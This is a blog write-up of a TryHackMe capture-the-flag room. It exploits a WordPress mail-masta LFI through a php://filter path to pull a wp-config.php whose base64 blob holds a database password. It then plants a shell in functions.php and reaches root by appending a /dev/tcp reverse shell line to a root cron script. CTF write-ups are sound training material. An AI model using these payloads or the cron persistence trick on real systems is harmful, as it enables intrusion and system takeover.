---
title: TryHackMe All in One
date: 2020-12-21
categories: [TryHackMe]
thumbnail: /assets/img/thm/allinone/allinone.png
excerpt: We use john to crack an SSH key.
tags: [enum4linux,hydra,ssh,linpeas,john,searchsploit]
---

## Enumeration

### Nmap

We'll start of with running our nmap scan:

`nmap -sC -sV -T4 -p- --max-rate 10000 $IP -oN full`

![nmap](/assets/img/thm/allinone/nmap.png)

We have a few ports open:

|PORT | SERVICE | STATE|
|-----|---------|------|
|21 | vsftpd 3.0.3 | open|
|22 | OpenSSH 7.6p1 | open|
|80 | Apache httpd 2.4.29 | open|

### FTP

We tried connecting to FTP with anonymous login, there wasn't anything there and we couldn't `put` anything there. So we moved on to the website.

![ftp](/assets/img/thm/allinone/ftp.png)

### Website

`Port 80` showed a default Apache page:

![website](/assets/img/thm/allinone/defaultapache.png)

Let's go with gobuster to see what directories we can work with.

![gobuster](/assets/img/thm/allinone/gobuster.png)

We found a `/wordpress` directory, so let's go visit it.

### Wordpress

![wordpress](/assets/img/thm/allinone/wordpress.png)

We should run another gobuster against this to see what else we can work with, running gobuster against the wordpress directory:

![gobuster-2](/assets/img/thm/allinone/gobuster-worpress.png)

Since we are working with wordpress we can enumerate using `wpscan`:

![wpscan](/assets/img/thm/allinone/wpscan.png)

We have a few plugins that this utilizes. `mail-masta 1.0` and `reflex-gallery 3.1.7`

Finding exploits for `mail-masta`:

[mail-masta exploit-db](https://www.exploit-db.com/exploits/40290)

>This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.

We can try navigating using the PoC that was provided in the `exploit-db` page using

`wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

![exploit](/assets/img/thm/allinone/mailmasta-exploit.png)

So we know we have a local file inclusion vulnerability, 

__php filter__

We can use a technique descibed in [SANS](https://www.sans.org/blog/getting-moar-value-out-of-php-local-file-include-vulnerabilities/)

>With the magic of the base64-encode PHP filter, though, the PHP interpreter will not interpret the resource as code. This allows us to see the original server-side PHP code content! 

Let's use this to grab with `wp-config.php` as this was one of the files we saw from fuzzing the wordpress directory.

`php://filter/convert.base64-encode/resource=../../../../../wp-config.php`

![phpfilter](/assets/img/thm/allinone/phpfilter.png)

```bash
echo "PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvb
i4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb
3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zd
XBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KL
yoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgK
TsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogR
GF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMga
WYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT
01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxd
WUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91I
GNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42L
jANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJ
n52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N
300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgI
CdCIEFUQGk" | base64 -d
```

__wp-config.php__

Once decoded, we were able to see the contents of `wp-config.php`, this contained a few credentials we can try to either use with SSH or to login through `wp-admin`.

```php
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', '**********' );
```

SSH didn't work, so let's move onto `wp-admin`

![admin](/assets/img/thm/allinone/wpadmin.png)

![admindash](/assets/img/thm/allinone/admindash.png)

## Getting a shell

We can edit the `functions.php` to get our shell, that way all we have to do is hit the upload button and we get our shell immediately.

![upload](/assets/img/thm/allinone/uploadshell.png)

![shell](/assets/img/thm/allinone/shell.png)

We can navigate to `/dev/shm` or anyother world writable directory to upload [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

Running `linpeas` we see we have a cronjob runnning something called `script.sh` that's in `/var/backups`

![cron](/assets/img/thm/allinone/cron.png)

Looking at what sort of permissions `script.sh` has, we can see it is world read/write/executable, it also gets ran as root.

![script](/assets/img/thm/allinone/scriptperms.png)

So let's append our reverse bash shell to it.

`echo 'bash -i >& /dev/tcp/$LHOST/$PORT 0>&1' >> script.sh`

![script2](/assets/img/thm/allinone/editscript.png)

All we have to do is set up another netcat listener and wait little for the cronjob to execute.

![root](/assets/img/thm/allinone/root.png)

__Note__: flags are base64 encoded

